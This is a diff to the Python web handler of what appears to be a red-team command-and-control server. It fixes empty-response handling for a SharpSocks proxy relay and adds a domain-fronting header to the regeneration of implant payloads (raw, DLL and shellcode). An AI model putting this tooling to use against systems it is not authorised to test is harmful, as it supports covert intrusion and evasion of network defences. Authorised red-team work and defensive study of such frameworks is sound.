@@ -86,13 +86,16 @@ class MyHandler(BaseHTTPRequestHandler):
                 s.send_header("Connection", "close")
                 s.send_header("Content-Length", len(sharpout))
                 s.end_headers()
-                s.wfile.write(sharpout)
+                if (len(sharpout) > 0):
+                  s.wfile.write(sharpout)
+                else:
+                  s.wfile.write(bytes(" ","utf-8"))
             except HTTPError as e:
                 s.send_response(e.code)
                 s.send_header("Content-type", "text/html")
                 s.send_header("Connection", "close")
                 s.end_headers()
-                s.wfile.write("")
+                s.wfile.write(bytes(" ","utf-8"))
             except Exception as e:
                 open("%swebserver.log" % ROOTDIR, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s \r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                 open("%swebserver.log" % ROOTDIR, "a").write("[-] SharpSocks  %s\r\n" % e)
@@ -432,13 +435,17 @@ class MyHandler(BaseHTTPRequestHandler):
                     s.send_response(200)
                     s.send_header("Content-type", "text/html")
                     s.end_headers()
-                    s.wfile.write(res.read())
+                    sharpout = res.read()
+                    if (len(sharpout) > 0):
+                      s.wfile.write(sharpout)
+                    else:
+                      s.wfile.write(bytes(" ","utf-8"))
                 except HTTPError as e:
                     s.send_response(e.code)
                     s.send_header("Content-type", "text/html")
                     s.send_header("Connection", "close")
                     s.end_headers()
-                    s.wfile.write("")
+                    s.wfile.write(bytes(" ","utf-8"))
                 except Exception as e:
                     open("%swebserver.log" % ROOTDIR, "a").write("[-] Error with SharpSocks - is SharpSocks running %s%s\r\n%s\r\n" % (SocksHost, UriPath, traceback.format_exc()))
                     open("%swebserver.log" % ROOTDIR, "a").write("[-] SharpSocks  %s\r\n" % e)
@@ -489,11 +496,12 @@ if __name__ == '__main__':
             os.rename("%spayloads" % ROOTDIR, "%spayloads_old" % ROOTDIR)
             os.makedirs("%spayloads" % ROOTDIR)
             C2 = get_c2server_all()
-            newPayload = Payloads(C2[5], C2[2], HostnameIP, C2[3], C2[8], C2[12],
+            newPayload = Payloads(C2[5], C2[2], HostnameIP, DomainFrontHeader, C2[8], C2[12],
                                   C2[13], C2[11], "", "", C2[19], C2[20], C2[21], get_newimplanturl(), PayloadsDirectory)
             new_urldetails("updated_host", HostnameIP, C2[3], "", "", "", "")
             update_item("HostnameIP", "C2Server", HostnameIP)
             update_item("QuickCommand", "C2Server", QuickCommand)
+            update_item("DomainFrontHeader", "C2Server", DomainFrontHeader)
             newPayload.CreateRaw()
             newPayload.CreateDlls()
             newPayload.CreateShellcode()
